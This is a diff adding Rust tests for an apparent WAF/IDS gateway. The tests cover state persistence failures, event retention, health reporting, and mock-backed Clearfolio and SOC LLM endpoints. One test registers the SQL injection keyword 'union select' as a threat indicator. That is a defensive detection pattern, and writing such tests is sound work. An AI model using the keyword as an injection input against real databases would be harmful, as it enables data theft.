+            serde_json::to_vec_pretty(&AppData::seeded()).unwrap(),
+        )
+        .await
+        .unwrap();
+        let valid_state = AppState::load(AppConfig {
+            admin_token: None,
+            state_path: Some(valid_path.clone()),
+            dnsbl_origin: "dnsbl.example".to_string(),
+            event_limit: 10,
+        })
+        .await
+        .unwrap();
+        assert_eq!(valid_state.inner.read().await.routes[0].id, "demo");
+        let _ = fs::remove_file(valid_path).await;
+
+        let local_path = PathBuf::from(format!(
+            "waf-ids-state-unit-{}-{}.json",
+            std::process::id(),
+            SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .unwrap()
+                .as_nanos()
+        ));
+        persist_state(&local_path, &AppData::seeded())
+            .await
+            .unwrap();
+        let _ = fs::remove_file(local_path).await;
+
+        let invalid_path = temp_state_path("invalid-json");
+        fs::write(&invalid_path, "{").await.unwrap();
+        let result = AppState::load(AppConfig {
+            admin_token: None,
+            state_path: Some(invalid_path.clone()),
+            dnsbl_origin: "dnsbl.example".to_string(),
+            event_limit: 10,
+        })
+        .await;
+        assert!(result.is_err());
+        let error = result.err().unwrap();
+        assert!(error.contains("not valid JSON"));
+        let _ = fs::remove_file(invalid_path).await;
+
+        let dir_path = temp_state_path("state-dir");
+        fs::create_dir_all(&dir_path).await.unwrap();
+        let error = load_or_seed_state(&dir_path).await.unwrap_err();
+        assert!(error.contains("failed to read state file"));
+        let _ = fs::remove_dir_all(&dir_path).await;
+
+        let parent_file = temp_state_path("parent-file");
+        fs::write(&parent_file, "not a directory").await.unwrap();
+        let nested_path = parent_file.join("state.json");
+        let error = persist_state(&nested_path, &AppData::seeded())
+            .await
+            .unwrap_err();
+        assert!(error.contains("failed to create state directory"));
+        let _ = fs::remove_file(parent_file).await;
+
+        let write_dir = temp_state_path("write-dir");
+        fs::create_dir_all(&write_dir).await.unwrap();
+        let error = persist_state(&write_dir, &AppData::seeded())
+            .await
+            .unwrap_err();
+        assert!(error.contains("failed to replace state file"));
+        let _ = fs::remove_dir_all(write_dir).await;
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn load_surfaces_state_rewrite_failures() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let read_only_parent = temp_state_path("read-only-parent");
+        fs::create_dir_all(&read_only_parent).await.unwrap();
+        let read_only_file = read_only_parent.join("state.json");
+        fs::write(
+            &read_only_file,
+            serde_json::to_vec_pretty(&AppData::seeded()).unwrap(),
+        )
+        .await
+        .unwrap();
+        std::fs::set_permissions(&read_only_parent, std::fs::Permissions::from_mode(0o500))
+            .unwrap();
+        let result = AppState::load(AppConfig {
+            admin_token: None,
+            state_path: Some(read_only_file.clone()),
+            dnsbl_origin: "dnsbl.example".to_string(),
+            event_limit: 10,
+        })
+        .await;
+        assert!(
+            result
+                .err()
+                .unwrap()
+                .contains("failed to write temporary state file")
+        );
+        std::fs::set_permissions(&read_only_parent, std::fs::Permissions::from_mode(0o700))
+            .unwrap();
+        let _ = fs::remove_dir_all(read_only_parent).await;
+
+        let read_only_dir = temp_state_path("read-only-dir");
+        fs::create_dir_all(&read_only_dir).await.unwrap();
+        std::fs::set_permissions(&read_only_dir, std::fs::Permissions::from_mode(0o500)).unwrap();
+        let result = AppState::load(AppConfig {
+            admin_token: None,
+            state_path: Some(read_only_dir.join("state.json")),
+            dnsbl_origin: "dnsbl.example".to_string(),
+            event_limit: 10,
+        })
+        .await;
+        assert!(
+            result
+                .err()
+                .unwrap()
+                .contains("failed to write temporary state file")
+        );
+        std::fs::set_permissions(&read_only_dir, std::fs::Permissions::from_mode(0o700)).unwrap();
+        let _ = fs::remove_dir_all(read_only_dir).await;
+    }
+
+    #[tokio::test]
+    async fn persistence_failures_return_operator_visible_errors() {
+        let failing_path = temp_state_path("persist-dir");
+        fs::create_dir_all(&failing_path).await.unwrap();
+        let state = AppState::new(
+            AppData {
+                routes: vec![RouteConfig {
+                    id: "mock".to_string(),
+                    path_prefix: "/mock".to_string(),
+                    upstream: "mock://mock".to_string(),
+                    mode: EnforcementMode::Monitor,
+                    enabled: true,
+                    block_threshold: None,
+                }],
+                threats: Vec::new(),
+                operator_threat_keys: Vec::new(),
+                dnsbl: Vec::new(),
+                events: Vec::new(),
+                next_event_id: 1,
+                audit_logs: Vec::new(),
+                next_audit_log_id: 1,
+                commercial: CommercialProfile::seeded(),
+                threat_feeds: Vec::new(),
+                threat_feed_ownership: Vec::new(),
+            },
+            AppConfig {
+                admin_token: None,
+                state_path: Some(failing_path.clone()),
+                dnsbl_origin: "dnsbl.local".to_string(),
+                event_limit: 10,
+            },
+        );
+        let app = build_app(state);
+
+        let route_response = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/routes",
+                None,
+                &RouteConfig {
+                    id: "new".to_string(),
+                    path_prefix: "/new".to_string(),
+                    upstream: "mock://new".to_string(),
+                    mode: EnforcementMode::Monitor,
+                    enabled: true,
+                    block_threshold: None,
+                },
+            ),
+        )
+        .await;
+        assert_eq!(route_response.status(), StatusCode::INTERNAL_SERVER_ERROR);
+        let routes: Vec<RouteConfig> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/routes")).await).await;
+        assert!(!routes.iter().any(|route| route.id == "new"));
+
+        let threat_response = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threats",
+                None,
+                &ThreatIndicator {
+                    value: "union select".to_string(),
+                    indicator_type: "sqli".to_string(),
+                    severity: Severity::High,
+                    source: "unit".to_string(),
+                    ttl_seconds: 60,
+                },
+            ),
+        )
+        .await;
+        assert_eq!(threat_response.status(), StatusCode::INTERNAL_SERVER_ERROR);
+        let threats: Vec<ThreatIndicator> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threats")).await).await;
+        assert!(threats.is_empty());
+
+        let dnsbl_response = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/dnsbl",
+                None,
+                &DnsblEntry {
+                    address: "203.0.113.10".parse().unwrap(),
+                    code: "127.0.0.2".to_string(),
+                    reason: "scanner".to_string(),
+                    source: "unit".to_string(),
+                    ttl_seconds: 300,
+                    prefix_len: None,
+                },
+            ),
+        )
+        .await;
+        assert_eq!(dnsbl_response.status(), StatusCode::INTERNAL_SERVER_ERROR);
+        let dnsbl: Vec<DnsblEntry> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/dnsbl")).await).await;
+        assert!(dnsbl.is_empty());
+
+        let license_response = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/commercial/license",
+                None,
+                &enterprise_profile(),
+            ),
+        )
+        .await;
+        assert_eq!(license_response.status(), StatusCode::INTERNAL_SERVER_ERROR);
+        let license: CommercialProfile = json_body(
+            app_request(&app, empty_request(Method::GET, "/api/commercial/license")).await,
+        )
+        .await;
+        assert_eq!(license.license_status, LicenseStatus::Unlicensed);
+
+        let feed_response = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-feeds/import",
+                None,
+                &threat_feed_import(),
+            ),
+        )
+        .await;
+        assert_eq!(feed_response.status(), StatusCode::INTERNAL_SERVER_ERROR);
+        let feeds: Vec<ThreatFeedStatus> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threat-feeds")).await)
+                .await;
+        assert!(feeds.is_empty());
+
+        let gateway_response = app_request(&app, empty_request(Method::GET, "/gateway/mock")).await;
+        assert_eq!(gateway_response.status(), StatusCode::OK);
+        let events: Vec<SecurityEvent> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/events")).await).await;
+        assert!(events.is_empty());
+        let _ = fs::remove_dir_all(failing_path).await;
+    }
+
+    #[tokio::test]
+    async fn event_retention_keeps_latest_events_and_next_id() {
+        let state = AppState::new(
+            AppData::seeded(),
+            AppConfig {
+                admin_token: None,
+                state_path: None,
+                dnsbl_origin: "dnsbl.example".to_string(),
+                event_limit: 2,
+            },
+        );
+
+        record_event(
+            &state,
+            None,
+            None,
+            "monitored",
+            "one".to_string(),
+            0,
+            "/one",
+        )
+        .await;
+        record_event(
+            &state,
+            None,
+            None,
+            "monitored",
+            "two".to_string(),
+            0,
+            "/two",
+        )
+        .await;
+        record_event(
+            &state,
+            None,
+            None,
+            "blocked",
+            "three".to_string(),
+            100,
+            "/three",
+        )
+        .await;
+
+        let data = state.inner.read().await;
+        assert_eq!(data.events.len(), 2);
+        assert_eq!(data.events[0].id, 2);
+        assert_eq!(data.events[1].id, 3);
+        assert_eq!(data.next_event_id, 4);
+    }
+
+    #[test]
+    fn health_reports_runtime_configuration() {
+        let state = AppState::new(
+            AppData::seeded(),
+            AppConfig {
+                admin_token: None,
+                state_path: Some(PathBuf::from("state.json")),
+                dnsbl_origin: "dnsbl.example.".to_string(),
+                event_limit: 25,
+            },
+        );
+
+        assert_eq!(
+            state.health_status(),
+            HealthStatus {
+                status: "ok".to_string(),
+                persistence: "file".to_string(),
+                dnsbl_origin: "dnsbl.example".to_string(),
+                event_limit: 25,
+                credentials_source: "none".to_string(),
+                admin_auth_configured: false,
+            }
+        );
+
+        let authed = state
+            .clone()
+            .with_admin_tokens(parse_admin_tokens("tok:operator"))
+            .with_credentials_source(CredentialSource::File);
+        let health = authed.health_status();
+        assert_eq!(health.credentials_source, "file");
+        assert!(health.admin_auth_configured);
+    }
+
+    fn clearfolio_test_config(base_url: &str) -> ClearfolioConfig {
+        ClearfolioConfig {
+            base_url: base_url.to_string(),
+            tenant_id: "buyer-demo".to_string(),
+            subject_id: "buyer-demo".to_string(),
+            permissions: "job:read".to_string(),
+        }
+    }
+
+    #[test]
+    fn clearfolio_helpers_build_urls_headers_and_documents() {
+        assert_eq!(
+            clearfolio_submit_url("http://c"),
+            "http://c/api/v1/convert/jobs"
+        );
+        assert_eq!(
+            clearfolio_submit_url("http://c/"),
+            "http://c/api/v1/convert/jobs"
+        );
+        assert_eq!(
+            clearfolio_status_url("http://c/", "J1"),
+            "http://c/api/v1/convert/jobs/J1"
+        );
+        let config = clearfolio_test_config("http://c");
+        let headers = clearfolio_tenant_headers(&config);
+        assert_eq!(headers[0], ("X-Clearfolio-Tenant-Id", "buyer-demo"));
+        assert_eq!(headers[1], ("X-Clearfolio-Subject-Id", "buyer-demo"));
+        assert_eq!(headers[2], ("X-Clearfolio-Permissions", "job:read"));
+
+        let data = AppData::seeded();
+        let (name, bytes) = clearfolio_document("evidence-manifest", &data).unwrap();
+        assert_eq!(name, "evidence-manifest.txt");
+        assert!(!bytes.is_empty());
+        let (name, _) = clearfolio_document("soc-export", &data).unwrap();
+        assert_eq!(name, "soc-export.txt");
+        assert!(clearfolio_document("unknown", &data).is_none());
+    }
+
+    #[tokio::test]
+    async fn clearfolio_config_reports_enabled_state() {
+        let off = build_app(AppState::seeded(None));
+        let disabled: serde_json::Value = json_body(
+            app_request(&off, empty_request(Method::GET, "/api/clearfolio/config")).await,
+        )
+        .await;
+        assert_eq!(disabled["enabled"], false);
+        assert_eq!(disabled["base_url"], serde_json::Value::Null);
+
+        let on = build_app(
+            AppState::seeded(None)
+                .with_clearfolio(Some(clearfolio_test_config("http://viewer.example"))),
+        );
+        let enabled: serde_json::Value =
+            json_body(app_request(&on, empty_request(Method::GET, "/api/clearfolio/config")).await)
+                .await;
+        assert_eq!(enabled["enabled"], true);
+        assert_eq!(enabled["base_url"], "http://viewer.example");
+        assert_eq!(enabled["kinds"][0], "evidence-manifest");
+    }
+
+    #[tokio::test]
+    async fn clearfolio_submit_and_status_guard_paths() {
+        // Admin token required -> 401 without one.
+        let secured = build_app(
+            AppState::seeded(Some("secret".to_string()))
+                .with_clearfolio(Some(clearfolio_test_config("http://127.0.0.1:1"))),
+        );
+        assert_eq!(
+            app_request(
+                &secured,
+                empty_request(Method::POST, "/api/clearfolio/documents/evidence-manifest")
+            )
+            .await
+            .status(),
+            StatusCode::UNAUTHORIZED
+        );
+        assert_eq!(
+            app_request(
+                &secured,
+                empty_request(Method::GET, "/api/clearfolio/jobs/J1")
+            )
+            .await
+            .status(),
+            StatusCode::UNAUTHORIZED
+        );
+
+        // Not configured -> 503.
+        let unconfigured = build_app(AppState::seeded(None));
+        assert_eq!(
+            app_request(
+                &unconfigured,
+                empty_request(Method::POST, "/api/clearfolio/documents/evidence-manifest")
+            )
+            .await
+            .status(),
+            StatusCode::SERVICE_UNAVAILABLE
+        );
+        assert_eq!(
+            app_request(
+                &unconfigured,
+                empty_request(Method::GET, "/api/clearfolio/jobs/J1")
+            )
+            .await
+            .status(),
+            StatusCode::SERVICE_UNAVAILABLE
+        );
+
+        // Configured but unknown document kind -> 404 (before any upstream call).
+        let configured = build_app(
+            AppState::seeded(None)
+                .with_clearfolio(Some(clearfolio_test_config("http://127.0.0.1:1"))),
+        );
+        assert_eq!(
+            app_request(
+                &configured,
+                empty_request(Method::POST, "/api/clearfolio/documents/unknown")
+            )
+            .await
+            .status(),
+            StatusCode::NOT_FOUND
+        );
+    }
+
+    #[tokio::test]
+    async fn clearfolio_submit_and_status_relay_success_and_upstream_errors() {
+        let mock = Router::new()
+            .route(
+                "/api/v1/convert/jobs",
+                post(|| async {
+                    (
+                        StatusCode::ACCEPTED,
+                        [("content-type", "application/json")],
+                        r#"{"jobId":"J1","status":"PENDING","statusUrl":"/api/v1/convert/jobs/J1"}"#,
+                    )
+                }),
+            )
+            .route(
+                "/api/v1/convert/jobs/{id}",
+                get(|| async {
+                    (
+                        StatusCode::OK,
+                        [("content-type", "application/json")],
+                        r#"{"status":"SUCCEEDED","docId":"D1"}"#,
+                    )
+                }),
+            );
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        tokio::spawn(axum::serve(listener, mock).into_future());
+
+        let app = build_app(
+            AppState::seeded(None)
+                .with_clearfolio(Some(clearfolio_test_config(&format!("http://{addr}")))),
+        );
+
+        let submit = app_request(
+            &app,
+            empty_request(Method::POST, "/api/clearfolio/documents/evidence-manifest"),
+        )
+        .await;
+        assert_eq!(submit.status(), StatusCode::ACCEPTED);
+        let submit_body: serde_json::Value = json_body(submit).await;
+        assert_eq!(submit_body["jobId"], "J1");
+
+        let status = app_request(&app, empty_request(Method::GET, "/api/clearfolio/jobs/J1")).await;
+        assert_eq!(status.status(), StatusCode::OK);
+        let status_body: serde_json::Value = json_body(status).await;
+        assert_eq!(status_body["docId"], "D1");
+
+        // Unreachable upstream -> 502 on both submit and status.
+        let dead_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let dead_addr = dead_listener.local_addr().unwrap();
+        drop(dead_listener);
+        let down = build_app(
+            AppState::seeded(None)
+                .with_clearfolio(Some(clearfolio_test_config(&format!("http://{dead_addr}")))),
+        );
+        assert_eq!(
+            app_request(
+                &down,
+                empty_request(Method::POST, "/api/clearfolio/documents/soc-export")
+            )
+            .await
+            .status(),
+            StatusCode::BAD_GATEWAY
+        );
+        assert_eq!(
+            app_request(&down, empty_request(Method::GET, "/api/clearfolio/jobs/J1"))
+                .await
+                .status(),
+            StatusCode::BAD_GATEWAY
+        );
+    }
+
+    fn soc_test_event() -> SecurityEvent {
+        SecurityEvent {
+            id: 1,
+            timestamp_unix: 1000,
+            client_ip: Some("203.0.113.5".parse().unwrap()),
+            route_id: Some("demo".to_string()),
+            action: "blocked".to_string(),
+            reason: "sqli signature".to_string(),
+            score: 90,
+            path: "/gateway/demo".to_string(),
+        }
+    }
+
+    fn state_with_event_and_llm(base_url: &str) -> AppState {
+        let mut data = AppData::seeded();
+        data.events.push(soc_test_event());
+        AppState::new(data, AppConfig::memory(None)).with_soc_llm(Some(SocLlmConfig {
+            base_url: base_url.to_string(),
+            token: "test-token".to_string(),
+            model: "contextual-orchestrator".to_string(),
+        }))
+    }
+
+    async fn spawn_chat_mock(response: &'static str) -> std::net::SocketAddr {
+        let app = Router::new().route(
+            "/v1/chat/completions",
+            post(move || async move {
+                (
+                    StatusCode::OK,
+                    [("content-type", "application/json")],
+                    response,
+                )
+            }),
+        );
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        tokio::spawn(axum::serve(listener, app).into_future());
+        addr
+    }
+
+    #[test]
+    fn soc_llm_chat_body_and_extract() {
+        let body = soc_llm_chat_body("m1", &soc_test_event());
+        assert_eq!(body["model"], "m1");
+        assert_eq!(body["messages"][0]["role"], "system");
+        assert!(
+            body["messages"][1]["content"]
+                .as_str()
+                .unwrap()
+                .contains("sqli signature")
+        );
+        // client_ip None branch renders "unknown".
+        let mut anon = soc_test_event();
+        anon.client_ip = None;
+        let anon_body = soc_llm_chat_body("m1", &anon);
+        assert!(
+            anon_body["messages"][1]["content"]
+                .as_str()
+                .unwrap()
+                .contains("client_ip: unknown")
+        );
+
+        let good = serde_json::json!({"choices":[{"message":{"content":"verdict"}}]});
+        assert_eq!(soc_llm_extract_content(&good).unwrap(), "verdict");
+        assert!(soc_llm_extract_content(&serde_json::json!({})).is_none());
+        // Empty `choices` array: the first-element lookup must short-circuit to None.
+        assert!(soc_llm_extract_content(&serde_json::json!({"choices":[]})).is_none());
+        // A choice with no `message` object must short-circuit to None.
+        assert!(soc_llm_extract_content(&serde_json::json!({"choices":[{}]})).is_none());
+        assert!(
+            soc_llm_extract_content(&serde_json::json!({"choices":[{"message":{}}]})).is_none()
+        );
+    }
+
+    #[tokio::test]
+    async fn soc_llm_config_reports_enabled_state() {
+        let off = build_app(AppState::seeded(None));
+        let disabled: serde_json::Value =
+            json_body(app_request(&off, empty_request(Method::GET, "/api/soc/llm-config")).await)
+                .await;
+        assert_eq!(disabled["enabled"], false);
+
+        let on = build_app(state_with_event_and_llm("http://llm.example"));
+        let enabled: serde_json::Value =
+            json_body(app_request(&on, empty_request(Method::GET, "/api/soc/llm-config")).await)
+                .await;
+        assert_eq!(enabled["enabled"], true);
+        assert_eq!(enabled["model"], "contextual-orchestrator");
+    }
+
+    #[tokio::test]
+    async fn soc_analyze_guard_paths() {
+        // Unauthorized.
+        let secured = build_app(
+            AppState::seeded(Some("secret".to_string())).with_soc_llm(Some(SocLlmConfig {
+                base_url: "http://127.0.0.1:1".to_string(),
+                token: "t".to_string(),
+                model: "m".to_string(),
+            })),
+        );
+        assert_eq!(
+            app_request(
+                &secured,
+                json_request(
+                    Method::POST,
+                    "/api/soc/analyze",
+                    None,
+                    &serde_json::json!({"event_id": 1})
+                )
+            )
+            .await
+            .status(),
+            StatusCode::UNAUTHORIZED
+        );
+
+        // Not configured -> 503.
+        let unconfigured = build_app(AppState::seeded(None));
+        assert_eq!(
+            app_request(
+                &unconfigured,
+                json_request(
+                    Method::POST,
+                    "/api/soc/analyze",
+                    None,
+                    &serde_json::json!({"event_id": 1})
+                )
+            )
+            .await
+            .status(),
+            StatusCode::SERVICE_UNAVAILABLE
+        );
+
+        // Configured but unknown event id -> 404.
+        let configured = build_app(state_with_event_and_llm("http://127.0.0.1:1"));
+        assert_eq!(
+            app_request(
+                &configured,
+                json_request(
+                    Method::POST,
+                    "/api/soc/analyze",
+                    None,
+                    &serde_json::json!({"event_id": 999})
+                )
+            )
+            .await
+            .status(),
+            StatusCode::NOT_FOUND
+        );
+    }
+
+    #[tokio::test]
+    async fn soc_analyze_success_and_upstream_errors() {
+        // Success: mock returns a chat completion.
+        let ok_addr =
+            spawn_chat_mock(r#"{"choices":[{"message":{"content":"Likely SQLi. High severity. Block the source IP."}}]}"#)
+                .await;
+        let app = build_app(state_with_event_and_llm(&format!("http://{ok_addr}")));
+        let resp = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/soc/analyze",
+                None,
+                &serde_json::json!({"event_id": 1}),
+            ),
+        )
+        .await;
+        assert_eq!(resp.status(), StatusCode::OK);
+        let body: serde_json::Value = json_body(resp).await;
+        assert_eq!(body["event_id"], 1);
+        assert!(body["analysis"].as_str().unwrap().contains("SQLi"));
+
+        // Missing choices[0].message.content -> 502.
+        let empty_addr = spawn_chat_mock("{}").await;
+        let empty_app = build_app(state_with_event_and_llm(&format!("http://{empty_addr}")));
+        assert_eq!(
+            app_request(
+                &empty_app,
+                json_request(
+                    Method::POST,
+                    "/api/soc/analyze",
+                    None,
+                    &serde_json::json!({"event_id": 1})
+                )
+            )
+            .await
+            .status(),
+            StatusCode::BAD_GATEWAY
+        );
+
+        // Non-JSON response -> 502.
+        let bad_addr = spawn_chat_mock("not json").await;
+        let bad_app = build_app(state_with_event_and_llm(&format!("http://{bad_addr}")));
+        assert_eq!(
+            app_request(
+                &bad_app,
+                json_request(
+                    Method::POST,
+                    "/api/soc/analyze",
+                    None,
+                    &serde_json::json!({"event_id": 1})
+                )
+            )
+            .await
+            .status(),
+            StatusCode::BAD_GATEWAY
+        );
+
+        // Unreachable upstream -> 502.
+        let dead = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let dead_addr = dead.local_addr().unwrap();
+        drop(dead);
+        let down = build_app(state_with_event_and_llm(&format!("http://{dead_addr}")));
+        assert_eq!(
+            app_request(
+                &down,
+                json_request(
+                    Method::POST,
+                    "/api/soc/analyze",
+                    None,
+                    &serde_json::json!({"event_id": 1})
+                )
+            )
+            .await
+            .status(),
+            StatusCode::BAD_GATEWAY
+        );
+    }
 }
